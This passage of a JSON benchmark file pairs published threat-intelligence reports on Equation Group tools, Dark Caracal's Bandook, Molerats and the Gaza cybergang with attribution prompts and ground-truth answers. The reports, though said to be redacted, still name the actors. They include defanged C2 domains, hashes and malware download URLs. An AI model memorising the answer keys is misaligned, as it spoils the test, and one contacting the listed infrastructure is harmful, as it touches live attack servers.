        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Equation Group"
    },
    {
        "url": "https://symantec-enterprise-blogs.security.com/threat-intelligence/buckeye-windows-zero-day-exploit",
        "Text": "Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak\nKey Findings\n•\tThe Buckeye attack group was using Equation Group tools to gain persistent access to target organizations at least a year prior to the Shadow Brokers leak.\n•\tVariants of Equation Group tools used by Buckeye appear to be different from those released by Shadow Brokers, potentially indicating that they didn't originate from that leak.\n•\tBuckeye's use of Equation Group tools also involved the exploit of a previously unknown Windows zero-day vulnerability. This zero day was reported by Symantec to Microsoft in September 2018 and patched in March 2019.\n•\tWhile Buckeye appeared to cease operations in mid-2017, the Equation Group tools it used continued to be used in attacks until late 2018. It is unknown who continued to use the tools. They may have been passed to another group or Buckeye may have continued operating longer than supposed.\nThe 2017 leak of Equation Group tools by a mysterious group calling itself the Shadow Brokers was one of the most significant cyber security stories in recent years. Equation is regarded as one of the most technically adept espionage groups and the release of a trove of its tools had a major impact, with many attackers rushing to deploy the malware and exploits disclosed. One of these tools, the EternalBlue exploit, was used to devastating effect in the May 2017 WannaCry ransomware outbreak.\nHowever, Symantec has now found evidence that the Buckeye cyber espionage group (aka APT3, Gothic Panda) began using Equation Group tools in attacks at least a year prior to the Shadow Brokers leak.\nBeginning in March 2016, Buckeye began using a variant of DoublePulsar (Backdoor.Doublepulsar), a backdoor that was subsequently released by the Shadow Brokers in 2017. DoublePulsar was delivered to victims using a custom exploit tool (Trojan.Bemstour) that was specifically designed to install DoublePulsar.\nBemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers. One vulnerability is a Windows zero-day vulnerability (CVE-2019-0703) discovered by Symantec. The second Windows vulnerability (CVE-2017-0143) was patched in March 2017 after it was discovered to have been used by two exploit tools—EternalRomance and EternalSynergy—that were also released as part of the Shadow Brokers leak.\nThe zero-day vulnerability allows for the leaking of information and can be exploited in conjunction with other vulnerabilities to attain remote kernel code execution. It was reported by Symantec to Microsoft in September 2018 and was patched on March 12, 2019.\nHow Buckeye obtained Equation Group tools at least a year prior to the Shadow Brokers leak remains unknown.\nBuckeye disappeared in mid-2017 and three alleged members of the group were indicted in the U.S. in November 2017. However, while activity involving known Buckeye tools ceased in mid-2017, the Bemstour exploit tool and the DoublePulsar variant used by Buckeye continued to be used until at least September 2018 in conjunction with different malware.\n\nHistory of attacks\nThe Buckeye attack group had been active since at least 2009, when it began mounting a string of espionage attacks, mainly against organizations based in the U.S.\nThe group has a record of exploiting zero-day vulnerabilities. These include CVE-2010-3962 as part of an attack campaign in 2010 and CVE-2014-1776 in 2014. Although other zero-day attacks have been reported, they have not been confirmed by Symantec. All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash.\nTimeline of attacks\nBeginning in August 2016, a group calling itself the Shadow Brokers began releasing tools it claimed to have originated from the Equation Group. It initially released samples of the information it had, offering the full trove to the highest bidder. Over the coming months, it progressively released more tools, until April 2017, when it released a final, large cache of tools, including the DoublePulsar backdoor, the FuzzBunch framework, and the EternalBlue, EternalSynergy, and EternalRomance exploit tools.\nHowever, Buckeye had already been using some of these leaked tools at least a year beforehand. The earliest known use of Equation Group tools by Buckeye is March 31, 2016, during an attack on a target in Hong Kong. During this attack, the Bemstour exploit tool was delivered to victims via known Buckeye malware (Backdoor.Pirpi). One hour later, Bemstour was used against an educational institution in Belgium.\nBemstour is specifically designed to deliver a variant of the DoublePulsar backdoor. DoublePulsar is then used to inject a secondary payload, which runs in memory only. The secondary payload enables the attackers to access the affected computer even after DoublePulsar is removed. It is worth noting that earlier versions did not include any means of uninstalling the DoublePulsar implant. This functionality was added in later versions.\nA significantly improved variant of the Bemstour exploit tool was rolled out in September 2016, when it was used in an attack against an educational institution in Hong Kong. While the original variant was only capable of exploiting 32-bit systems, the new variant could exploit both 32-bit and 64-bit targets, adding support for newer Windows versions. Another new feature of the payload in the second variant allowed the attacker to execute arbitrary shell commands on the infected computer. This custom payload is also designed to copy arbitrary files and execute arbitrary processes on the targeted computer. When used against 32-bit targets, Bemstour still delivered the same DoublePulsar backdoor. However, against 64-bit targets it delivered only the custom payload. The attackers typically used it to execute shell commands that created new user accounts.\nBemstour was used again in June 2017 in an attack against an organization in Luxembourg. Unlike earlier attacks when Bemstour was delivered using Buckeye’s Pirpi backdoor, in this attack Bemstour was delivered to the victim by a different backdoor Trojan (Backdoor.Filensfer). Between June and September 2017, Bemstour was also used against targets in the Philippines and Vietnam.\nDevelopment of Bemstour has continued into 2019. The most recent sample of Bemstour seen by Symantec appears to have been compiled on March 23, 2019, eleven days after the zero-day vulnerability was patched by Microsoft.\nThe purpose of all the attacks was to acquire a persistent presence on the victim’s network, meaning information theft was the most likely motive of the attacks. \nThe Filensfer connection\nFilensfer is a family of malware that has been used in targeted attacks since at least 2013. Symantec has found multiple versions of the malware, including a C++ version, a compiled Python version (using py2exe), and a PowerShell version.\nOver the past three years, Filensfer has been deployed against organizations in Luxembourg, Sweden, Italy, the UK, and the U.S. Targets included organizations in the telecoms, media, and manufacturing sectors. While Symantec has never observed the use of Filensfer alongside any known Buckeye tools, information shared privately by another vendor included evidence of Filensfer being used in conjunction with known Buckeye malware (Backdoor.Pirpi).\nBemstour exploit tool\nBemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers.\nThe zero-day vulnerability found and reported by Symantec (CVE-2019-0703) occurs due to the way the Windows SMB Server handles certain requests. The vulnerability allows for the leaking of information.\nThe second vulnerability (CVE-2017-0143) is a message type confusion vulnerability. When the two vulnerabilities are exploited together, the attacker can gain full access in the form of kernel mode code execution, enabling them to deliver malware to the targeted computer.\nWhen Bemstour was first used in 2016, both vulnerabilities were zero days, although CVE-2017-0143 was subsequently patched by Microsoft in March 2017 (MS17-010). CVE-2017-0143 was also used by two other exploit tools—EternalRomance and EternalSynergy—that were released as part of the Shadow Brokers leak in April 2017.  \nBuckeye's exploit tool, EternalRomance, as well as EternalSynergy, can exploit the CVE-2017-0143 message type confusion vulnerability to perform memory corruption on unpatched victim computers. In order to obtain remote code execution capabilities, all three exploit tools needed to collect information about the memory layout of attacked systems in addition to exploiting the aforementioned message type confusion vulnerability. Each tool performed this differently, relying on different vulnerabilities. In the case of the Buckeye exploit tool, the attackers exploited their own zero-day vulnerability (CVE-2019-0703).\nDoublePulsar development\nThe variant of DoublePulsar used in the first attacks performed by Buckeye was different to that leaked by the Shadow Brokers. It appears to contain code to target newer versions of Windows (Windows 8.1 and Windows Server 2012 R2), indicating that it is a newer version of the malware. It also includes an additional layer of obfuscation. Based on technical features and timing, it is possible that this obfuscation was created by DoublePulsar's original authors.\nIt is noteworthy that the attackers never used the FuzzBunch framework in its attacks. FuzzBunch is a framework designed to manage DoublePulsar and other Equation Group tools and was leaked by the Shadow Brokers in 2017. This suggests that Buckeye only managed to gain access to a limited number of Equation Group tools.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Equation Group"
    },
    {
        "url": "https://www.eff.org/deeplinks/2023/02/uncle-sow-dark-caracal-latin-america",
        "Text": "In 2018, EFF along with researchers from Lookout Security published a report describing the Advanced Persistent Threat (APT) we dubbed \"Dark Caracal.\" Now we have uncovered a new Dark Caracal campaign operating since March of 2022, with hundreds of infections across more than a dozen countries. In this report we will present evidence that the cyber mercenary group Dark Caracal is still active and continues to be focused on Latin America, as was reported last year. We have discovered that Dark Caracal, using the Bandook spyware, is currently infecting over 700 computers in Central and South America, primarily in The Dominican Republic and Venezuela. \nIn our original 2018 report, we described a campaign targeting thousands of Lebanese citizens with several different malware families, including a brand new mobile remote access trojan we named Pallas and a Windows remote access trojan called Bandook. Through our research we were able to shut down the malware campaign and notify a number of the victims. Our Operation Manul report established that the actors behind the campaign were working with the governments of Lebanon and Kazakhstan. The variety of targets and the apparent involvement of multiple governments throughout the campaigns lead us to believe that Dark Caracal is a cyber-mercenary or hack-for-hire group. \nSince our original Dark Caracal report, there have been multiple reports on their continued activities. Checkpoint Research wrote about a campaign in 2020 and we have continued to follow the activities of Dark Caracal with our most recent report, also in 2020.  Most recently, ESET wrote about Dark Caracal activities in Latin America in their report Bandidos at Large.\nDark Caracal is far from the only malware group currently targeting Latin America. The Quantum malware group targeted the Dominican Republic’s Ministry of Agriculture in 2022. The Dominican Republic is also a reported customer of NSO group.\nGiven Dark Caracal’s history of working with national governments — such as Kazakhstan and Lebanon — on politically motivated campaigns, it is possible that the new campaign described below is also at the behest of a government actor, but without more insight into who the infected computers belong to, we cannot draw any conclusions as to the motivation of these attacks.\nRegardless, we call on lawmakers and regulators in South and Central America to be vigilant against Dark Caracal's spyware since it, and other spyware like it, has been used to commit gross human rights violations. Time and again, nation-states and cyber-mercenaries have used spyware to target activists, human rights defenders, and journalists whose actual work is to uncover governments' wrongdoing, speak truth to power and hold governments accountable. Such targeting has resulted in a growing list of extrajudicial killings of journalists and human rights defenders.\nGovernments should consider calling for a moratorium on the governmental use of these malware technologies, support computer security research, and  human rights  for all, including transparency, accountability and redress for victims.\nGovernments must recognize that government hostility to device security is dangerous for their people. If one government can use malware against civilians under a rival government there is nothing stopping the rival government from doing the same. Governments should be focusing on improving computer security and protecting their citizens rights to freedom of expression. \nWe hope this report will add to a body of work exposing cyber mercenaries and convince policymakers that cyber mercenaries and nation-state hacking are truly a global threat to human rights and civil society.\nA new campaign appears \nRecently we discovered a new version of the Bandook malware, which has been updated to have 148 unique commands it can send the infected computer, far more than the 120 available in previous samples. This sample and related samples seem to be part of a campaign that began in March 2022, utilizing a new command and control server (a remote computer which issues orders to the infected computers and receives data stolen from the infected computers) at the domain deapproved[.]ru.\nIn the “Bandidos at Large” report, ESET researchers detailed a mechanism within Bandook for downloading Windows DLLs (software libraries for Windows) from a domain secondary to the main command and control server to gain additional functionality. On analyzing the samples we obtained, we found that in this case the mechanism for downloading additional DLLs pointed to the domain unclesow[.]com. However, upon investigating, we realized that the unclesow.com domain had not yet been registered. We figured that this domain could provide information on Dark Caracal’s activities, so we registered it and set up a sinkhole (a server which hosts a domain that previously belonged to a malware campaign to protect infected computers and collect information.)\nUnclesow[.]com is currently hosted by EFF. Since registering this domain, we have been collecting aggregate information on the victims of this malware campaign. Based on daily traffic logs, there appear to be between 600 and 800 infected machines at any time, mostly across Central and South America. Since every Bandook infection connects to the secondary domain multiple times per day, we are confident that we are seeing all infections for this current campaign. Because of our concern for the privacy of the victims of this malware campaign we have configured the server to delete logs after four weeks and collect the bare minimum of necessary information. \nThe same day that we set up DNS entries for unclesow[.]com, several other domains that had been previously registered had their DNS suddenly pointed at the same server that hosted unclesow. There were 6 domains pointed automatically at our server:\nsetsizee[.]com\nseconsave[.]com\nscanlostt[.]com\nsanesity[.]biz\nEmail-securlink[.]com\ngoadaaddy[.]com\nBased on the timing and apparent phishing-related nature of these domains, we suspect this was an automatic process, possibly set up by the same people running the Dark Caracal campaign. A few days later, several of the domains were pointed at a new IP address not under our control. However, three of the domains (seconsave[.]com scanlostt[.]com and sensity[.]biz) still point to our sinkhole server. We were able to identify several other related domains which were hosted on other servers at the same time as these domains (when they were not pointing to our sinkhole.)\nThe connection of these domains to the current Dark Caracal campaign is unclear. They may be for a different campaign or another purpose The tactics and tools and procedures used don’t match up, with the above domains being hosted on DigitalOcean registered with NameCheap and not mentioned in the Bandook samples, whereas the domains mentioned in the Bandook samples are hosted with the bulletproof hosting provider OvO [ovo.sc], and registered with a company called 1984 [1984.is]. Additionally, we observed no interesting traffic or traffic indicative of a Bandook infection to any of the domains pointed at our sinkhole other than unclesow[.]com. The only connection to this campaign for these domains is the fact that they were pointed at our sinkhole automatically when we set it up. For now it remains a mystery. \nSince we registered the unclesow[.]com domain, the attackers have changed the command and control domain twice, first to cudenpower.co and then to bomes[.]ru. However, in both cases and still to this day, they have not changed the secondary infection domain from unclesow[.]com, thus our sinkhole continues to function even for new samples of malware. It is unclear whether the malware operators realize that their secondary domain is controlled by us at this time. \nBandook Continues Evolving\nThe versions of Bandook this campaign uses appear to be newer than the ones used in the last campaigns reported on by ESET. The first stage of the malware has switched from using GOST for encryption of the payload to using DES for encryption of its second stage payload. The key for decryption is derived from a passphrase by hashing it with the  RIPEMD-128 algorithm. \nAdditionally the malware contains 148 possible commands it can send the infected computer from the command and control server instead of the previous 132 in the samples analyzed by ESET. The commands include capabilities such as: turning on the webcam, adding or removing files from the computer, taking control of the mouse, recording the screen, starting a remote desktop session, and downloading other libraries for additional functionality (see appendix for more.) \nThese changes indicate a deep nexus to the Dark Caracal group as the source code for Bandook is not public and the malware is not for sale as far as we know. \nAt the time of this report, unpacked versions of malware were detected by 41 out of 70 antivirus products in VirusTotal whereas a representative sample of the packed malware was detected by 35 out of 71 antivirus products. \nThe command and control servers are more locked-down than we have seen in the past, with the only open services being SSH and the command and control service listening on port 2222. There is no web administration interface as has been seen in the past. \nVictimology \nFrom connections to our sinkhole we have observed victims in several Central and South American countries. Approximately 75% of infected computers are located in The Dominican Republic and 20% in Venezuela. \nBecause the infected computers connect to the sinkhole server and make an http GET request for the path `/flras/get.php?huln=nevi` approximately every three hours we can reliably estimate the number of infected machines. At its peak we suspect more than 800 computers were infected in this malware campaign. However, this number may be lower if some machines are changing their IP addresses in the middle of the day due to moving to a new network or a dynamic IP address changing. Since all connections initiated by Bandook use a standard user agent (see Appendix) we do not have a way to keep track of individual machines when they change IP addresses. \nBecause Bandook malware samples have only ever been observed for Windows, we assume that the infected machines are all Windows computers.  According to Shodan data, many of the IP addresses belong to commodity routers on consumer ISP networks. It is our assumption that those routers have dynamic IP addresses that frequently change, thus increasing the number of unique IPs connecting to our sinkhole. \nInfections drop off on Saturdays and especially Sundays, leading us to believe that most infected machines are located at places of business. This hypothesis is also supported by the number of connections from infected machines dropping on major public holidays such as Christmas Eve, Christmas, and New Year’s Day. \n\nThough we haven’t been able to contact any of the victims of this current campaign, their location opens the possibility that it is a continuation of the campaign outlined in the Bandidos at Large Report. Because of Dark Caracal’s history of working on behalf of governments, we can’t discount that possibility here either, though the client’s identity remains a mystery for now. \nThanks to ESET, Martjin Grooten, Jeremy Kennely, Bill Marczak, and VirusTotal, for assistance with this research. \n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Dark Caracal"
    },
    {
        "url": "https://www.eff.org/deeplinks/2020/12/dark-caracal-you-missed-spot",
        "Text": "Security researchers at EFF have tracked APTs (Advanced Persistent Threats) targeting civil society for many years now. And while in many cases, the “advanced” appellation is debatable, “persistent” is not. Since 2015, EFF has tracked the cyber-mercenaries known as Dark Caracal, a threat actor who has carried out digital surveillance campaigns on behalf of government interests in Kazakhstan and Lebanon.\n\nRecent activity seems to indicate that this actor is active once again. In November of 2019 the group Malware Hunter Team discovered new samples of the Bandook malware which is associated with Dark Caracal. This time with legitimate signing certificates for Windows (issued by the “Certum” certificate authority,) which would allow them to be run without a warning to the user on any Windows computer. Tipped off by the emergence of new variants of the Bandook Trojan, researchers at Checkpoint found three new variants of Bandook: some expanded (120 commands), some slimmed down (11 commands), and all signed with Certum certificates. The Checkpoint researchers also discovered several new command and control domains in use by Dark Caracal.\n\nIn previous campaigns, this actor has displayed impressively lax operational security, enabling researchers to download terabytes of data from their command and control servers. The latest campaign exhibits a somewhat higher level of opsec. Checkpoint reports that targets included “Government, financial, energy, food industry, healthcare, education, IT and legal institutions” in the following countries: Singapore, Cyprus, Chile, Italy, USA, Turkey, Switzerland, Indonesia and Germany.",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Dark Caracal"
    },
    {
        "url": "https://www.cybereason.com/hubfs/dam/collateral/reports/Molerats-in-the-Cloud-New-Malware-Arsenal-Abuses-Cloud-Platforms-in-Middle-East-Espionage-Campaign.pdf",
        "Text": "Threat Actors Assessed to be Molerats (aka The Gaza Cybergang): An Arabic-speaking, politically\nmotivated group that has operated in the Middle East since 2012.\n• New Espionage Tools Developed by Molerats: Cybereason identified two new backdoors dubbed\nSharpStage and DropBook, as well as the MoleNet downloader, all of which can allow the attackers the\nability to execute arbitrary code and collect sensitive data for exfiltration from infected computers. The newly\ndiscovered backdoors were used in conjunction with the previously reported Spark backdoor previously\nattributed to Molerats.\n• Targeting Across the Middle East: Cybereason assesses that the campaign operators seek to target high\nranking political figures and government officials in the Middle East, including the Palestinian Territories,\nUAE, Egypt and Turkey.\n• Political Phishing Themes: Themes used to lure the victims included the Israeli-Saudi relations, Hamas\nelections, Palestinian politiicians as well as other recent political events including recent meeting between\nHis Royal Highness Mohammed bin Salman, Crown Prince of Saudi Arabia (MBS), the U.S. Secretary of State\nMike Pompeo and Israeli PM Benjamin Netanyahu.\n• Abuse of Facebook, Google Docs, Dropbox and Simplenote Platforms: The newly discovered\nDropBook backdoor used fake Facebook accounts or Simplenote for command and control (C2) operations,\nand both SharpStage and DropBook implement a Dropbox client in order to exfiltrate the data stolen from\ntheir targets to a cloud storage, as well as for storing their espionage tools.\n• Connection to the Pierogi Backdoor: Analysis shows a correlation between the newly discovered\nbackdoors, Spark and the previously reported Pierogi backdoor. Cybereason estimates with moderate-tohigh confidence that they were developed by different teams operating on behalf of similar interests or by\nthe same threat actor.\n• Using Quasar RAT: The attackers used new espionage tools to download additional payloads from DropBox\nincluding the infamous open-source Quasar RAT that was used before by the Gaza Cybergang.\nMolerats in the Cloud 5\nThe Discovery of Molerats’\nNew Cyber Arsenal\nWhile hunting for Middle Eastern threats, Cybereason’s Nocturnus team stumbled upon couple of unique malware\nsamples analysis proved to be previously undocumented. These two backdoors, dubbed SharpStage, DropBook,\nand the MoleNet downloader share multiple campaign similarities in TTPs and phishing themes, and were also\ndelivered in conjunction with the Spark backdoor previously attributed to the Gaza Cybergang, aka Molerats.\nMolerats are known to lure their victims using political and Middle Eastern themed phishing files, and this\ntime they stuck to their way, using recent political events that took place including the peace agreement or\nnormalization process between Israel and neighboring Arab countries",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Gaza cybergang"
    },
    {
        "url": "https://www.kaspersky.com/blog/gaza-cybergang/26363/",
        "Text": "The Gaza cybergang and its SneakyPastes campaign\nA cybergang that specializes in cyberespionage, with its campaign mostly limited to the Middle East and countries in central Asia.\n\n\nKaspersky Team\n\nApril 10, 2019\n\n\nAt our Kaspersky Security Analyst Summit (SAS) conference we traditionally speak about APT attacks: It was there that we first published info about Slingshot, Carbanak, and Careto. Targeted attacks are running as high as ever, and this year was no exception: At SAS 2019 in Singapore we spoke about an APT criminal group called the Gaza cybergang.\n\nRich armory\nThe Gaza cybergang specializes in cyberespionage, with its campaign mostly limited to the Middle East and countries in central Asia. At the center of its focus are politicians, diplomats, journalists, activists, and the region’s other politically active citizens.\n\nIn terms of the number of attacks we registered from January 2018 through January 2019, the targets located within the Palestinian territories were very comfortably in the lead. Quite a few infection attempts also fell on Jordan, Israel, and Lebanon. In its attacks, the gang uses methods and tools of varying complexity degrees.\n\nOur experts have identified three subgroups in the cybergang. We have already covered two of those. One was the author of the Desert Falcons campaign, and the other was behind the tailored attacks known as Operation Parliament.\n\nNow it’s time to talk about the third, which we call MoleRATs. The group is armed with relatively simple tools, but that doesn’t make its SneakyPastes campaign (named for its active use of pastebin.com) less dangerous.\n\nSneakyPastes\nThe campaign is multistage. It begins with phishing, using letters from one-time addresses and one-time domains. Sometimes the letters contain links to malware or infected attachments. If the victim executes the attached file (or follows the link), their device receives Stage One malware programmed to activate the infection chain.\n\nThe letters, meant to quiet the reader’s vigilance, are mostly about politics. They are either records of political negotiations or addresses from some credible organizations.\n\nOnce Stage One malware is safely onboard the computer, it tries to secure its position, conceal its presence from any antivirus products, and hide the command server.\n\nThe attackers use public services (pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com, and pomf.cat) for subsequent stages of the attack (including malware delivery) and, most important, for communication with the command server. Typically, they use several methods simultaneously to deliver the extracted information.\n\nFinally, the device gets infected with RAT malware, which offers powerful capabilities. Among other things, it can freely download and upload files, launch applications, search for documents, and encrypt information.\n\nThe malware scans the victim’s computer to locate all PDF, DOC, DOCX, and XLSX files, saves them to temporary file folders, classifies, archives, and encrypts them, and finally sends them to a command server via a chain of domains.\n\nIn fact, we detect multiple tools used in this kind of attack. You can learn more about them and get more technical details from this post on Securelist.",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Gaza cybergang"
    },
    {
        "url": "https://securelist.com/gaza-cybergang-updated-2017-activity/82765/",
        "Text": "New targets, use of MS Access Macros and CVE 2017-0199, and possible mobile espionage\n1. Summary information\nThe Gaza cybergang is an Arabic-language, politically-motivated cybercriminal group, operating since 2012 and actively targeting the MENA (Middle East North Africa) region. The Gaza cybergang’s attacks have never slowed down and its typical targets include government entities/embassies, oil and gas, media/press, activists, politicians, and diplomats.\n\nOne of the interesting new facts, uncovered in mid-2017, is its discovery inside an oil and gas organization in the MENA region, infiltrating systems and pilfering data, apparently for more than a year.\n\nAnother interesting finding is the use of the recently discovered CVE 2017-0199 vulnerability, and Microsoft Access files into which the download scripts were embedded to reduce the likelihood of their detection. Traces of mobile malware that started to appear from late April 2017, are also being investigated.\n\nRecent targets for the group seem to be varied in nature; the attackers do not appear to be choosing targets selectively, but rather seeking different kinds of MENA intelligence.\n\nSome of the interesting new updates about the Gaza cybergang:\n\nGaza cybergang attackers have continued their interest in government entities in MENA\nNew targets identified include oil and gas in MENA\nNew tools and techniques include\nAbuse of the CVE 2017-0199 vulnerability\nUsage of macros inside Microsoft Access files, enabling lower detection rates\nPossible Android mobile malware being used by attackers\nPrevious published research:\nhttps://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/\n\nKaspersky Lab products and services successfully detect and block Gaza cybergang attacks, detection names below:\n\nHEUR:Exploit.MSOffice.Generic\nHEUR:Trojan.Win32.Cometer.gen\nHEUR:Trojan.Win32.Generic\nTrojan-Downloader.Win32.Downeks\nTrojan-Spy.MSIL.Downeks\nWin32.Bublik\nWin32.Agentb\nMore information about Gaza cybergang is available to customers of the Kaspersky Intelligence Reporting Service. Contact: intelreports@kaspersky.com\n\n2. Technical details\nPreviously, Gaza cybergang attacks were surprisingly successful in using simple and common tools to achieve their goals. They relied on a variety of Remote Access Trojans (RATs) to perform their activities, including Downeks, Qasar, Cobaltstrike…\n\nAs recently as June 2017, however, the attackers started using the CVE 2017-0199 vulnerability which enables direct code execution from a Microsoft office document on non-patched victim systems (Cobaltstrike payload in this case). Another finding is a possible Android Trojan that the attackers positioned on one of their command servers in April 2017.\n\nIn most cases, malware is sent by email as a compressed attachment or download links. Starting from March 2017, we have observed downloaders or Microsoft office documents with embedded macros being sent to victims. When opened, the downloader would contact a URL or IP address to retrieve the actual payload. Once successfully executed, the malware grants full access to the attackers, providing them with the ability to collect files, keystrokes and screenshots from victims’ devices. If the initial downloaded malware was detected by the victim, the downloader would attempt to retrieve other malware files to the victim’s device, in the hope that one of those files would work.\n\nThe full list of indicators of compromise (IOCs) can be found in Appendix I. The list of the most interesting lure content, malware files and related droppers, and command servers can be found in Appendix II.\n\n3. Summary of recent campaigns\nBelow can be found the list of recent findings related to Gaza cybergang operations:\n\nCommand and control server\tHash\tFirst seen\tFile name/Social engineering lure\nupgrade.newshelpyou[.]com\t552796e71f7ff304f91b39f5da46499b\t25-07-2017\tnvStView.exe\n6fba58b9f9496cc52e78379de9f7f24e\t23-03-2017\t??? ????.exe\n(Translation: Special photos)\neb521caebcf03df561443194c37911a5\t03-04-2017\t??? ????.exe\n(Translation: Special photos)\nmoreoffer[.]life\t66f144be4d4ef9c83bea528a4cd3baf3\t27-05-2017\t????? ????? ??? ?????? ???????? ?? ?????? ????? ???????.exe\n(Translation: A statement by the Emir of Qatar accusing the UAE of breaking the news agency)\n3ff60c100b67697163291690e0c2c2b7\t11-05-2017\tMOM.InstallProxy.exe\nb7390bc8c8a9a71a69ce4cc0c928153b\t05-04-2017\t???? ??? ??????? ???? ????? ????????\n(Translation: Learn about the woman wearing niqab which offended Saudi)\nf43188accfb6923d62fe265d6d9c0940\t21-03-2017\tGcc-Ksa-uae.exe\n056d83c1c1b5f905d18b3c5d58ff5342\t16-03-2017\t?????? ????? ?????? ????? ???????.exe\n(Translation: Correspondence regarding the meeting of Heads of Missions)\n138.68.242[.]68\t87a67371770fda4c2650564cbb00934d\t20-06-2017\thamas.doc\n???? ????? ???? ????? ??? ????????.doc (Translation: the points of agreement between Hamas and the reformist Fateh movement)\n???? ?????? ?????? ??? ??????.doc (Translation: minutes of the tonight meeting)\n???? ?? ???? ???????? ??? ???????? ???????.doc (Translation: An advance on salary or full salary for employees next Tuesday?)\nlol.mynetav[.]org\t4f3b1a2088e473c7d2373849deb4536f\t20-06-2017\tNotepad.exe\nattachment.scr\nhttps://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU\nsignup.updatesforme[.]club\t7d3426d8eb70e4486e803afb3eeac14f\t04-05-2017\tPalestinian Retirement Authority Ramallah.exe\n0ee4757ab9040a95e035a667457e4bc6\t27-04-2017\t27-4-2017 Fateh Gaza plo.exe\nping.topsite[.]life\tb68fcf8feb35a00362758fc0f92f7c2e\t19-03-2017\tDownloaded by Macro in MDB files:\nhttp://download.data-server.cloudns[.]club/indexer.exe\n7bef124131ffc2ef3db349b980e52847\t13-03-2017\t???? ??????? ???? -???? ???? ?????? ??????? .exe\n(Translation: Brother Ismail Haniyeh – Deputy Head of the Political Bureau)\nd87c872869023911494305ef4acbd966\t19-03-2017\tDownloaded by Macro in MDB files: http://download.data-server.cloudns[.]club/wordindexer.exe\na3de096598e3c9c8f3ab194edc4caa76\t12-04-2017\tviewimages.exe\nc078743eac33df15af2d9a4f24159500\t28-03-2017\tviewimages.exe\n70d03e34cadb0f1e1bc6f4bf8486e4e8\t30-03-2017\tdownload-file.duckdns[.]org/send/Egyptian_agreement_with_President_Mahmoud_Abbas.exe\n67f48fd24bae3e63b29edccc524f4096\t17-04-2017\thttp://alasra-paper.duckdns[.]org/send/?????_???_?????? ???????_?????_?? ????_???.rar\n(Message from President Abu Mazen to Hamas in Gaza Strip)\n7b536c348a21c309605fa2cd2860a41d\t17-04-2017\thttp://alasra-paper.duckdns[.]org/send/????_??????_???????_???_??????? .rar\n(Translation: captives paper submitted to stop the strike)\nalasra-paper.duckdns[.]org\tMobile malware N/A\t23-04-2017\tPossible Android malware. http://alasra-paper.duckdns[.]org/send/%D9%88%ket-Edition-1.04_ApkHouse.com/Dont-Starve-Pocket-Edition-1.04_ApkHouse.com.apk\nhamas-wathaq.duckdns[.]org\tcf9d89061917e9f48481db80e674f0e9\t16-04-2017\t????? ???? ???? ??? ?? ??? ???? ????? ??? .exe\n(Translation: Documents published for the first time on Hamas ruling of Gaza Strip)\nmanual.newphoneapp[.]com\t86a89693a273d6962825cf1846c3b6ce\t02-02-2017\tSQLiteDatabaseBrowserPortable.exe\n3f67231f30fa742138e713085e1279a6\t02-02-2017\tSQLiteDatabaseBrowserPortable.exe\nThe above listed files are further described in Appendix 1.\n\n4. New findings\nGaza Cybergang attackers have been continuously evolving their skills on different levels, using new methods and techniques to deliver malware, in addition to adapting social engineering decoys to regional political and humanitarian incidents.\n\nIn mid-2017, the attackers were discovered inside an oil and gas organization in the MENA region, infiltrating systems and pilfering data, apparently for more than a year. The malware files that were found had been reported previously: https://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/\n\nWhile traces of Android mobile malware have been spotted, attackers have continuously used the Downeks downloader and the Quasar or Cobaltstrike RATs to target Windows devices, enabling them to obtain remote access spying and data exfiltration abilities. This is now achieved more efficiently using the CVE 2017-0199 vulnerability which enables direct code execution abilities from a Microsoft office document on non-patched victim Windows systems. The use of Microsoft Access database files has also enabled the attackers to maintain low levels of detection, as it’s not an uncommon method to deliver malware.\n\nThese developments have helped the attackers continue their operations, targeting a variety of victims and organizations, sometimes even bypassing defences and persisting for prolonged periods.",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Gaza cybergang"
    },
    {
